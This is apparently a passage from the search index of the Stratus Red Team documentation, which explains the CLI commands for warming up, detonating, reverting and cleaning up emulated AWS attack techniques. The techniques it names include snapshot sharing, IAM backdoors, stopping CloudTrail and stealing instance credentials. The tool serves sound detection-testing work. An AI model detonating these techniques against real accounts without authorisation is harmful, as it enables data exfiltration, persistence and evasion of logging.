a snapshot.\nDetonation: Calls ModifySnapshotAttribute to share the snapshot.\n</code></pre> <p>Detonate an attack technique using:</p> <pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>This will handle warm-up and detonation (but not cleanup - explicitly use <code>--cleanup</code> for this).</p> <pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot --cleanup\n</code></pre> <p>Alternatively, you can handle warm-up and detonation independently:</p> <pre><code>stratus warmup aws.exfiltration.ec2-share-ebs-snapshot\nstratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>Cleanup can also be done through:</p> <pre><code>stratus cleanup aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>At any time, you can view the state of the TTPs:</p> <pre><code>stratus status\n\n+------------------------------------------------------------+-----------+\n| TECHNIQUE                                                  | STATUS    |\n+------------------------------------------------------------+-----------+\n| aws.exfiltration.ec2-share-ebs-snapshot | WARM      |\n| aws.persistence.iam-backdoor-user                          | DETONATED |\n| aws.persistence.iam-backdoor-role                          | WARM      |\n| aws.persistence.iam-create-admin-user                         | COLD      |\n+------------------------------------------------------------+-----------+\n</code></pre>"},{"location":"user-guide/commands/","title":"Commands reference","text":"<ul> <li>Autocompletion</li> <li>list</li> <li>status</li> <li>show</li> <li>warmup</li> <li>detonate</li> <li>revert</li> <li>cleanup</li> </ul>"},{"location":"user-guide/commands/autocompletion/","title":"Autocompletion","text":"<p>Stratus Red Team uses cobra's built-in support to add autocompletions when working with the CLI.</p>"},{"location":"user-guide/commands/autocompletion/#sample-usage","title":"Sample usage","text":"<pre><code>stratus deton[tab]\nstratus detonate aws[tab][tab]\n</code></pre>"},{"location":"user-guide/commands/autocompletion/#setup","title":"Setup","text":""},{"location":"user-guide/commands/autocompletion/#through-homebrew","title":"Through Homebrew","text":"<p>When installing Stratus Red Team through Homebrew, shell completions are automatically installed for bash, zsh and fish shells.</p>"},{"location":"user-guide/commands/autocompletion/#manually","title":"Manually","text":"bashzshfish <p>Ensure you have bash-completion installed (<code>brew install bash-completion</code>  / <code>apt install bash-completion</code>), then run:</p> Mac OSLinux <pre><code># Install bash-completion if necessary\nbrew install bash-completion\n\nstratus completion bash &gt; /usr/local/etc/bash_completion.d/stratus\necho \"source /usr/local/etc/bash_completion\" &gt;&gt; ~/.bashrc\n</code></pre> <pre><code># Install bash-completion if necessary\nsudo apt install bash-completion\n\nmkdir -p /etc/bash_completion.d\nstratus completion bash &gt; /etc/bash_completion.d/stratus\necho \"source /etc/bash_completion\" &gt;&gt; ~/.bashrc\n</code></pre> <pre><code>echo \"autoload -U compinit; compinit\" &gt;&gt; ~/.zshrc\nsource ~/.zshrc\nstratus completion zsh &gt; \"${fpath[1]}/_stratus\"\n</code></pre> <pre><code>stratus completion fish &gt; ~/.config/fish/completions/stratus.fish\n</code></pre>"},{"location":"user-guide/commands/cleanup/","title":"<code>stratus cleanup</code>","text":"<p>Cleans up any leftover infrastructure from an attack technique.</p>"},{"location":"user-guide/commands/cleanup/#sample-usage","title":"Sample Usage","text":"Clean up an attack technique<pre><code>stratus cleanup aws.defense-evasion.cloudtrail-stop\n</code></pre> Clean up all attack techniques that can be cleaned up<pre><code>stratus cleanup --all\n</code></pre>"},{"location":"user-guide/commands/cleanup/#difference-with-status-revert","title":"Difference with <code>status revert</code>","text":"<p><code>stratus revert</code> is about reverting the side effects of a detonation. In addition to reverting an attack technique, <code>stratus cleanup</code> also takes care of removing all prerequisite infrastructure from your live environment.</p>"},{"location":"user-guide/commands/detonate/","title":"<code>stratus detonate</code>","text":"<p>Detonates an attack technique.</p> <ul> <li>If the technique was previously warmed up using <code>stratus warmup</code>, it will not be warmed up again.</li> <li>Otherwise, <code>stratus detonate</code> will automatically warm up the technique before detonating it.</li> </ul>"},{"location":"user-guide/commands/detonate/#sample-usage","title":"Sample Usage","text":"Detonate an attack technique<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy\n</code></pre> Detonate multiple attack techniques<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy aws.defense-evasion.cloudtrail-stop\n</code></pre> Detonate an attack technique, then automatically clean up any resources deployed on AWS<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy --cleanup\n</code></pre>"},{"location":"user-guide/commands/list/","title":"<code>stratus list</code>","text":""},{"location":"user-guide/commands/list/#sample-usage","title":"Sample Usage","text":"List all available attack techniques<pre><code>stratus list\n</code></pre> List available attack techniques for AWS<pre><code>stratus list --platform aws\n</code></pre> List available attack techniques for the MITRE ATT&amp;CK 'persistence' tactic<pre><code>stratus list --platform aws --mitre-attack-tactic persistence\n</code></pre>"},{"location":"user-guide/commands/revert/","title":"<code>stratus revert</code>","text":"<p>Reverts the detonation of an attack technique, when applicable.</p> <p>Some attack techniques are not idempotent, meaning that you cannot detonate them multiple times because of their side effect. For instance, Stop a CloudTrail Trail stops a CloudTrail Trail when detonated. Consequently, it cannot be detonated again (as the Trail is already stopped).</p> <p><code>stratus revert</code> ensures that a non-idempotent technique is reverted to a state where it can be detonated again.</p>"},{"location":"user-guide/commands/revert/#sample-usage","title":"Sample Usage","text":"Revert an attack technique<pre><code>stratus revert aws.persistence.lambda-backdoor-function\n</code></pre>"},{"location":"user-guide/commands/revert/#difference-with-stratus-cleanup","title":"Difference with <code>stratus cleanup</code>","text":"<p><code>stratus cleanup</code> both reverts an attack technique, and removes any deployed prerequisite infrastructure from your live environment. </p>"},{"location":"user-guide/commands/show/","title":"<code>stratus show</code>","text":""},{"location":"user-guide/commands/show/#sample-usage","title":"Sample Usage","text":"Display more information about an attack technique<pre><code>stratus show aws.credential-access.ec2-steal-instance-credentials\n</code></pre>"},{"location":"user-guide/commands/status/","title":"<code>stratus status</code>","text":"<p>Displays the current state of the attack techniques.</p> <p>See: Stratus Red Team attack technique states</p>"},{"location":"user-guide/commands/status/#sample-usage","title":"Sample Usage","text":"List the current state of available attack techniques<pre><code>stratus status\n</code></pre>"},{"location":"user-guide/commands/status/#sample-output","title":"Sample output","text":"<pre><code>+------------------------------------------------------------+--------------------------------------------------------+-------------+\n| ID                                                         | NAME                                                   | STATUS      |\n+------------------------------------------------------------+--------------------------------------------------------+-------------+\n| aws.defense-evasion.cloudtrail-stop                        | Stop a CloudTrail Trail                                | WARM        |\n| aws.defense-evasion.organizations-leave                    | Attempt to Leave the AWS Organization                  | COLD        |\n| aws.defense-evasion.vpc-remove-flow-logs                   | Remove VPC Flow Logs                                   | WARM        |\n| aws.persistence.iam-backdoor-user                          | Create an Access Key on an IAM User                    | DETONATED   |\n+------------------------------------------------------------+--------------------------------------------------------+-------------+\n</code></pre>"},{"location":"user-guide/commands/warmup/","title":"<code>stratus warmup</code>","text":"<p>\"Warm up\" an attack technique by spinning up the prerequisite infrastructure or configuration, without detonating it.</p> <p>For example, the attack technique Exfiltrate an AMI by Sharing It needs an AMI before the detonation phase can detonate the attack, and share it with an external AWS account.</p>"},{"location":"user-guide/commands/warmup/#sample-usage","title":"Sample Usage","text":"Warm up an attack technique<pre><code>stratus warmup aws.exfiltration.ec2-share-ami\n</code></pre> Warm up multiple attack techniques<pre><code>stratus warmup aws.exfiltration.ec2-share-ami aws.exfiltration.s3-backdoor-bucket-policy\n</code></pre> (advanced) Warm up again an attack technique that was already WARM, to ensure its prerequisites are met<pre><code>stratus warmup aws.exfiltration.ec2-share-ami --force\n</code></pre>"}]}